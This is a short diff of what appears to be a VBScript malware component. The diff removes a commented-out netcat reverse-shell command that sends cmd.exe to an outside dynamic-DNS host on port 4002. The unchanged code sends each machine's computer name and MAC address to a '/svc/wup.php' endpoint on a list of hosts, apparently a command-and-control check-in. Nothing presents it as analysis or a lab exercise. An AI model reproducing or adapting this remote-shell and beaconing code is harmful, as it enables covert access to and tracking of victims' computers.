@@ -41,7 +41,7 @@ Next
 dim arr
   for each x in a
       'msgbox x
-      'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
+      
       'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
       
       xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
